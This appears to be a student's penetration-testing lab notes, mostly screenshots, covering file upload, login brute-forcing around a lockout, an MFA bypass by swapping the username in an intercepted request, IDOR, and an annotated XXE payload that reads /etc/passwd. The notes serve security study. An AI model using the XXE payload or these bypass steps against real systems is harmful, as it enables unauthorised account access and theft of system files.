https://www.pwny.cc/web-attacks/insecure-file-upload
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md

![magicBytes1](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2012.53.02.png)

![magicBytes2](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2013.50.13.png)

![magicBytes3](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2013.50.04.png)

![magicBytes4](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2013.50.24.png)

- Challenge

![challenge4FileUpload1](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2014.37.05.png)

![challenge4FileUpload2](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2014.35.52.png)

![challenge4FileUpload3](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2014.36.05.png)

5. Attacking Authentication

Authentication is the process of verifying that a user is who they claim to be.
Authorization involves verifying whether a user is allowed to do something after login/signup.

- Brute Force

Made an intruder by this POST request.

![BF1](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2015.49.01.png)

Added payload on the password spot

![BF2](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2015.49.15.png)

![Bf3](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2015.57.55.png)

![BF4](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2015.58.04.png)

![BF5](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2015.57.33.png)

![BF6](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2015.59.56.png)

Password was `letmein`

- MFA(Multi-factor authentication)

There are two ways to do this attack. One is doing brute-forcing after noticing the pattern of the two-factor authentication code. The other is to intercept the post request and then replace the username into target username. In this case, I did the second option because I could not see any pattern on this code.

There were no pattern on the MFA code.

![mfa1](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.31.49.png)

![mfa2](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.32.41.png)

I made a repeater, replaced jessamy into jeremy(target account), and then sent request again.

![mfa3](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.34.39.png)

It worked well.

In order to render a webpage logged in under jeremy,

I logged in jessamy user account.

![mfa4](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.37.30.png)

Inputted the mfa code.

![mfa5](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.37.57.png)

![mfa6](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.37.47.png)

Intercepted the request before I hit the submit.

![mfa7](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.38.06.png)

Hit the submit.

![mfa8](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.38.16.png)

Replaced by jeremy (target user)

![mfa9](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.38.39.png)

Hit the forward.

![mfa10](../assets/img/authenticationattack/Screenshot%202024-08-06%20at%2020.38.48.png)

- Challenge

This challenge was really difficult because of the lock after 5 login fail attempts. So I needed to cut 5 password payloads on each brute-forcing attempt.

To get a clue about password, I attempted to login with the usernames, such as admin, administrator, jeremy, jessamy, and password 123.

I could notice that admin and administrator were existed.

- admin

![adminUser](../assets/img/authenticationattack/Screenshot%202024-08-07%20at%2009.01.04.png)

- administrator

![administratorUser](../assets/img/authenticationattack/Screenshot%202024-08-07%20at%2009.37.05.png)

Made a intruder to do the brute-forcing username and password.

Set the cluster comb to do the brute-forcing username and password at the same time.

![intruder1](../assets/img/authenticationattack/Screenshot%202024-08-07%20at%2009.37.33.png)

Payload 1 for username

![intruder2](../assets/img/authenticationattack/Screenshot%202024-08-07%20at%2010.11.02.png)

Payload 2 for password

I set the password payload with 5 limitation because after 5 login fails, the account will be locked.

![intruder3](../assets/img/authenticationattack/Screenshot%202024-08-07%20at%2010.10.54.png)

Attack

![intruder4](../assets/img/authenticationattack/Screenshot%202024-08-07%20at%2010.10.42.png)

![intruder5](../assets/img/authenticationattack/Screenshot%202024-08-07%20at%2010.43.41.png)

6. XXE (External Entity Injection)

Some applications uses XML to transfer data. XML stands for extensible markup language. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features.

Test XXE vulnerabilities,

Prepared the xml payload to see if this website parse the xml file.

![xxe1](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.17.57.png)

![xxe2](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.19.05.png)

Let's retrieve user accounts.

![xxe3](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.14.27.png)

![xxe4](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.14.43.png)

![xxe5](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.15.12.png)

![xxe6](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.15.26.png)

To explain the xml payload,

```xml
<?xml version="1.0"?>
 <!-- This is the version declaration -->
<!DOCTYPE creds [
  <!ENTITY test SYSTEM 'file:///etc/passwd'>
]>
<!-- This is to declare an external entity named 'test'. The 'test' entity is set to the content of the file `/etc/passwd` -->
<creds>
<!-- This is the root element of the XML document -->
  <user>&test;</user>
  <!-- This contains entity reference. XML parser will attempt to replace `&test;` with the content of `/etc/passwd` -->
  <password>&test;</password>
</creds>
```

7. IDOR

This vulnerability can occur when developer expose userID, sessionID, or accountID on the url. It will make attackers to do the brute-force and get the user account information easily.

![idor1](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.43.19.png)

![idor2](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.43.25.png)

![idor3](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.46.59.png)

![idor4](../assets/img/webRevisited/Screenshot%202024-08-07%20at%2011.49.04.png)

# Wireless penetration testing

To test, I need to buy a wifi usb adapter... Let me see...

## What is a wireless penetrating testing?

# Reporting

Sample report

https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report
